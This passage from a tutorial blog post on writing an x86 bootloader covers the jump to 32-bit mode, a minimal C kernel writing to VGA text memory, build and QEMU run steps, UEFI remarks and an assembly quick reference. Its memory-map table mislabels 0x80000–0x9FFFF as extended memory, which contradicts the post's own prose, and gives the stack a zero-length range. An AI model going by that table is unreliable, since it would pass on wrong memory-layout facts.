We need a bigger stack now because we might be doing more complex things. The old stack was in the first 1MB, which is fine but cramped.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">call\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> BEGIN_32BIT\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Jump back to the MBR, which has a \u003Ccode>BEGIN_32BIT\u003C/code> label that calls our kernel. We’ve made it. We’re running 32-bit code.\u003C/p>\n\u003Ch2 id=\"the-kernel\">The Kernel\u003C/h2>\n\u003Cp>\u003Cimg src=\"/images/posts/bootloader/kernel.png\" alt=\"The Kernel\">\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#B392F0\"> main\u003C/span>\u003Cspan style=\"color:#E1E4E8\">() {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    char*\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> video \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">char*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">b8000\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">video \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 'X'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This is possibly the simplest kernel in existence.\u003C/p>\n\u003Cp>\u003Ccode>0xb8000\u003C/code> is the start of VGA text mode video memory. In text mode (which is what the BIOS sets up), the screen is 80x25 characters. Each character takes 2 bytes: one for the ASCII code, one for the attribute (color).\u003C/p>\n\u003Cp>By writing \u003Ccode>'X'\u003C/code> to \u003Ccode>0xb8000\u003C/code>, we put ‘X’ in the top-left corner of the screen. The default color is light gray on black, so you’ll see a light gray X.\u003C/p>\n\u003Cp>If you wanted to make it red:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">char*\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> video \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">char*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">b8000\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">video \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 'X'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(video \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">04\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003Cspan style=\"color:#6A737D\">  // Red on black\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The attribute byte is \u003Ccode>0x04\u003C/code> for red foreground, black background. The low nibble is foreground, high nibble is background.\u003C/p>\n\u003Cp>To write a string:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">char*\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> video \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">char*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">b8000\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">char*\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> message \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"Hello, World!\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">while\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#FFAB70\">message\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[i] \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#FFAB70\">    video\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[i\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#FFAB70\"> message\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[i];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#FFAB70\">    video\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[i\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">0F\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003Cspan style=\"color:#6A737D\">  // White on black\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    i\u003C/span>\u003Cspan style=\"color:#F97583\">++\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>No \u003Ccode>printf\u003C/code>. No standard library. Just raw memory writes. That’s what “freestanding” means - no hosted environment, no runtime support. Just you and the hardware.\u003C/p>\n\u003Ch2 id=\"the-memory-map-where-everything-lives\">The Memory Map: Where Everything Lives\u003C/h2>\n\u003Cp>Here’s what our memory looks like after loading:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>0x00000 - 0x003FF   Real Mode IVT (Interrupt Vector Table) - unused in protected mode\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00400 - 0x004FF   BIOS Data Area\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00500 - 0x006FF   Free (can use for bootloader data)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00700 - 0x008FF   Free\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00900 - 0x00900   Our bootloader stack (grows down from here)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x007C00 - 0x007DFF Our MBR (loaded by BIOS)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x007E00 - 0x00FFF  Free\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x01000 - 0x01FFF   Our kernel (loaded by MBR)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x02000 - 0x7FFFF   Free (conventional memory)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x80000 - 0x9FFFF   Extended memory (free)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xA0000 - 0xBFFFF   Video memory\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xC0000 - 0xFFFFF   BIOS ROM\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The first megabyte is called conventional memory. Above that is extended memory, which requires protected mode to access. That’s one reason we switch to protected mode - we want all 4GB of address space, not just 1MB.\u003C/p>\n\u003Ch2 id=\"building-this-thing\">Building This Thing\u003C/h2>\n\u003Cp>\u003Cimg src=\"/images/posts/bootloader/build.png\" alt=\"Building Process\">\u003C/p>\n\u003Cp>The Makefile orchestrates the build:\u003C/p>\n\u003Col>\n\u003Cli>\n\u003Cp>\u003Cstrong>Assemble the MBR\u003C/strong>: \u003Ccode>nasm -f bin master_boot_record.asm -o master_boot_record.bin\u003C/code>\u003C/p>\n\u003Cul>\n\u003Cli>\u003Ccode>-f bin\u003C/code> means output raw binary (not an object file)\u003C/li>\n\u003Cli>This produces exactly 512 bytes\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>Compile the kernel\u003C/strong>: \u003Ccode>gcc -m32 -ffreestanding -fno-pie -c kernel.c -o kernel.o\u003C/code>\u003C/p>\n\u003Cul>\n\u003Cli>\u003Ccode>-m32\u003C/code> targets 32-bit x86\u003C/li>\n\u003Cli>\u003Ccode>-ffreestanding\u003C/code> says we’re not hosted (no libc)\u003C/li>\n\u003Cli>\u003Ccode>-fno-pie\u003C/code> disables position-independent code\u003C/li>\n\u003Cli>\u003Ccode>-c\u003C/code> compiles but doesn’t link\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>Link the kernel\u003C/strong>: \u003Ccode>ld -m elf_i386 -Ttext 0x1000 --oformat binary kernel.o -o kernel.bin\u003C/code>\u003C/p>\n\u003Cul>\n\u003Cli>\u003Ccode>-Ttext 0x1000\u003C/code> means “put the code at address 0x1000”\u003C/li>\n\u003Cli>\u003Ccode>--oformat binary\u003C/code> outputs raw binary (not ELF)\u003C/li>\n\u003Cli>This strips all the ELF headers - we just want machine code\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>Concatenate\u003C/strong>: \u003Ccode>cat master_boot_record.bin kernel.bin > os-image.bin\u003C/code>\u003C/p>\n\u003Cul>\n\u003Cli>This creates a disk image: 512 bytes of MBR, then kernel\u003C/li>\n\u003Cli>When BIOS loads sector 1, it gets the MBR\u003C/li>\n\u003Cli>When the MBR loads sector 2+, it gets the kernel\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003C/ol>\n\u003Cp>The final \u003Ccode>os-image.bin\u003C/code> is what you’d write to a USB drive or floppy disk to make a bootable device. QEMU can boot from it directly.\u003C/p>\n\u003Ch2 id=\"running-and-testing\">Running and Testing\u003C/h2>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">make\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> run\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This fires up QEMU with your image. You should see a black screen with a single ‘X’ in the top-left corner. That’s your operating system.\u003C/p>\n\u003Ch2 id=\"a-note-on-modern-systems\">A Note on Modern Systems\u003C/h2>\n\u003Cp>Everything in this document assumes legacy BIOS boot. Modern systems use UEFI, which is completely different:\u003C/p>\n\u003Cul>\n\u003Cli>No 16-bit real mode\u003C/li>\n\u003Cli>PE32+ executables instead of raw binary\u003C/li>\n\u003Cli>FAT filesystem required\u003C/li>\n\u003Cli>Boot services API instead of BIOS interrupts\u003C/li>\n\u003Cli>Secure Boot signature verification\u003C/li>\n\u003C/ul>\n\u003Cp>UEFI is technically superior - better architecture, more features, no 40-year-old cruft. But it’s also more complex and less educational. Legacy BIOS boot teaches you what’s actually happening at the CPU level. UEFI hides that behind abstraction layers.\u003C/p>\n\u003Cp>Most computers still support “Legacy Boot” or “CSM” (Compatibility Support Module) mode. Enable that in BIOS settings if you want to test this bootloader on real hardware.\u003C/p>\n\u003Cp>For learning, start with BIOS. Understand the fundamentals. Then tackle UEFI when you know what problems it’s solving.\u003C/p>\n\u003Ch2 id=\"final-thoughts\">Final Thoughts\u003C/h2>\n\u003Cp>You’ve written code that runs on bare metal, with no OS underneath. You’ve talked directly to the CPU, set up memory segmentation, switched processor modes. This is as low-level as programming gets (well, except for writing microcode or designing CPUs, but that’s a different kind of low-level).\u003C/p>\n\u003Ch2 id=\"appendix-quick-reference\">Appendix: Quick Reference\u003C/h2>\n\u003Ch3 id=\"nasm-directives\">NASM Directives\u003C/h3>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">org \u003C/span>\u003Cspan style=\"color:#79B8FF\">0x7c00\u003C/span>\u003Cspan style=\"color:#6A737D\">          ; Set origin address\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">bits \u003C/span>\u003Cspan style=\"color:#79B8FF\">16\u003C/span>\u003Cspan style=\"color:#6A737D\">             ; Generate 16-bit code\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">bits \u003C/span>\u003Cspan style=\"color:#79B8FF\">32\u003C/span>\u003Cspan style=\"color:#6A737D\">             ; Generate 32-bit code\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">%\u003C/span>\u003Cspan style=\"color:#F97583\">include\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"file.asm\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ; Include another file\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">db\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0x00\u003C/span>\u003Cspan style=\"color:#6A737D\">             ; Define byte\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">dw\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0x0000\u003C/span>\u003Cspan style=\"color:#6A737D\">           ; Define word (2 bytes)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">dd\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0x00000000\u003C/span>\u003Cspan style=\"color:#6A737D\">       ; Define double word (4 bytes)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">dq\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0x0000000000000000\u003C/span>\u003Cspan style=\"color:#6A737D\"> ; Define quad word (8 bytes)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">times\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 10\u003C/span>\u003Cspan style=\"color:#F97583\"> db\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#6A737D\">       ; Repeat instruction 10 times\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">$                   \u003C/span>\u003Cspan style=\"color:#6A737D\">; Current address\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">$$                  \u003C/span>\u003Cspan style=\"color:#6A737D\">; Section start address\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">equ\u003C/span>\u003Cspan style=\"color:#6A737D\">                 ; Define constant\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch3 id=\"x86-registers-32-bit\">x86 Registers (32-bit)\u003C/h3>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>EAX, EBX, ECX, EDX  ; General purpose\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>ESI, EDI            ; Source/Destination index\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>EBP, ESP            ; Base/Stack pointer\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>EIP                 ; Instruction pointer\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>CS, DS, ES, FS, GS, SS ; Segment registers\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>CR0, CR2, CR3, CR4  ; Control registers\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch3 id=\"common-instructions\">Common Instructions\u003C/h3>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">mov\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> dest, src       \u003C/span>\u003Cspan style=\"color:#6A737D\">; Move data\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">add\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> dest, src       \u003C/span>\u003Cspan style=\"color:#6A737D\">; Add\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">sub\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> dest, src       \u003C/span>\u003Cspan style=\"color:#6A737D\">; Subtract\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">and\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> dest, src       \u003C/span>\u003Cspan style=\"color:#6A737D\">; Bitwise AND\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">or\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> dest, src        \u003C/span>\u003Cspan style=\"color:#6A737D\">; Bitwise OR\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">xor\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> dest, src       \u003C/span>\u003Cspan style=\"color:#6A737D\">; Bitwise XOR\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">push\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> src            \u003C/span>\u003Cspan style=\"color:#6A737D\">; Push onto stack\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">pop\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> dest            \u003C/span>\u003Cspan style=\"color:#6A737D\">; Pop from stack\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">call\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> label          \u003C/span>\u003Cspan style=\"color:#6A737D\">; Call function\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">ret\u003C/span>\u003Cspan style=\"color:#6A737D\">                 ; Return from function\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">jmp\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> label           \u003C/span>\u003Cspan style=\"color:#6A737D\">; Unconditional jump\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">je\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> label            \u003C/span>\u003Cspan style=\"color:#6A737D\">; Jump if equal\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">jne\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> label           \u003C/span>\u003Cspan style=\"color:#6A737D\">; Jump if not equal\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">jc\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> label            \u003C/span>\u003Cspan style=\"color:#6A737D\">; Jump if carry\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">jnc\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> label           \u003C/span>\u003Cspan style=\"color:#6A737D\">; Jump if not carry\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">cmp\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> op1, op2        \u003C/span>\u003Cspan style=\"color:#6A737D\">; Compare (sets flags)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0x13\u003C/span>\u003Cspan style=\"color:#6A737D\">            ; Software interrupt\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">cli\u003C/span>\u003Cspan style=\"color:#6A737D\">                 ; Clear interrupts\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">sti\u003C/span>\u003Cspan style=\"color:#6A737D\">                 ; Set interrupts\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">lgdt\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [address]      \u003C/span>\u003Cspan style=\"color:#6A737D\">; Load GDT\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch3 id=\"bios-interrupts-real-mode-only\">BIOS Interrupts (Real Mode Only)\u003C/h3>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>int 0x10            ; Video services\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  ah=0x00           ; Set video mode\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  ah=0x0e           ; Teletype output (print char)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>int 0x13            ; Disk services\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  ah=0x00           ; Reset disk controller  \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  ah=0x02           ; Read sectors\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  ah=0x03           ; Write sectors\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>int 0x16            ; Keyboard services\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  ah=0x00           ; Read keystroke\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  ah=0x01           ; Check for keystroke\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch3 id=\"useful-memory-addresses\">Useful Memory Addresses\u003C/h3>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>0x7C00              ; Boot sector load address\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xB8000             ; VGA text mode video memory\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0000-0x03FF       ; Real mode IVT\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0400-0x04FF       ; BIOS data area\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch3 id=\"gdt-access-byte-format\">GDT Access Byte Format\u003C/h3>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Bit 7: Present (must be 1)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Bit 6-5: Privilege level (0=kernel, 3=user)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Bit 4: Descriptor type (1=code/data, 0=system)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Bit 3: Executable (1=code, 0=data)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Bit 2: Direction/Conforming\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Bit 1: Readable (code) / Writable (data)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Bit 0: Accessed (set by CPU)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>That’s everything. Now go build something.\u003C/p>\n\u003Chr>\n\u003Cp>\u003Cstrong>Check out the full source code on GitHub:\u003C/strong> \u003Ca href=\"https://github.com/mooofin/SoftBoot\">mooofin/SoftBoot\u003C/a>\u003C/p>",{"headings":784,"localImagePaths":863,"remoteImagePaths":864,"frontmatter":865,"imagePaths":872},[785,788,791,794,797,800,803,806,809,812,815,818,821,824,827,830,833,836,839,842,845,848,851,854,857,860],{"depth":24,"slug":786,"text":787},"building-a-bootloader-from-scratch-a-deep-dive-into-x86-boot-process","Building a Bootloader from Scratch: A Deep Dive into x86 Boot Process",{"depth":27,"slug":789,"text":790},"the-problem-were-solving","The Problem We’re Solving",{"depth":24,"slug":792,"text":793},"why","WHY",{"depth":27,"slug":795,"text":796},"the-boot-process-what-actually-happens","The Boot Process: What Actually Happens",{"depth":40,"slug":798,"text":799},"power-on","Power On",{"depth":40,"slug":801,"text":802},"why-0x7c00","Why 0x7C00?",{"depth":40,"slug":804,"text":805},"why-512-bytes","Why 512 Bytes?",{"depth":27,"slug":807,"text":808},"the-master-boot-record","The Master Boot Record",{"depth":27,"slug":810,"text":811},"deep-dive-reading-from-disk","Deep Dive: Reading From Disk",{"depth":27,"slug":813,"text":814},"the-global-descriptor-table","The Global Descriptor Table",{"depth":40,"slug":816,"text":817},"memory-segmentation-why","Memory Segmentation: Why?",{"depth":40,"slug":819,"text":820},"gdt-structure","GDT Structure",{"depth":27,"slug":822,"text":823},"switching-to-protected-mode","Switching to Protected Mode",{"depth":27,"slug":825,"text":826},"the-kernel","The Kernel",{"depth":27,"slug":828,"text":829},"the-memory-map-where-everything-lives","The Memory Map: Where Everything Lives",{"depth":27,"slug":831,"text":832},"building-this-thing","Building This Thing",{"depth":27,"slug":834,"text":835},"running-and-testing","Running and Testing",{"depth":27,"slug":837,"text":838},"a-note-on-modern-systems","A Note on Modern Systems",{"depth":27,"slug":840,"text":841},"final-thoughts","Final Thoughts",{"depth":27,"slug":843,"text":844},"appendix-quick-reference","Appendix: Quick Reference",{"depth":40,"slug":846,"text":847},"nasm-directives","NASM Directives",{"depth":40,"slug":849,"text":850},"x86-registers-32-bit","x86 Registers (32-bit)",{"depth":40,"slug":852,"text":853},"common-instructions","Common Instructions",{"depth":40,"slug":855,"text":856},"bios-interrupts-real-mode-only","BIOS Interrupts (Real Mode Only)",{"depth":40,"slug":858,"text":859},"useful-memory-addresses","Useful Memory Addresses",{"depth":40,"slug":861,"text":862},"gdt-access-byte-format","GDT Access Byte Format",[],[],{"title":776,"date":866,"description":867,"tags":868},"2026-02-09","A minimal x86 bootloader from scratch - 512 bytes of assembly that loads a C kernel and switches to 32-bit protected mode",[773,869,870,871],"x86","assembly","osdev",[]]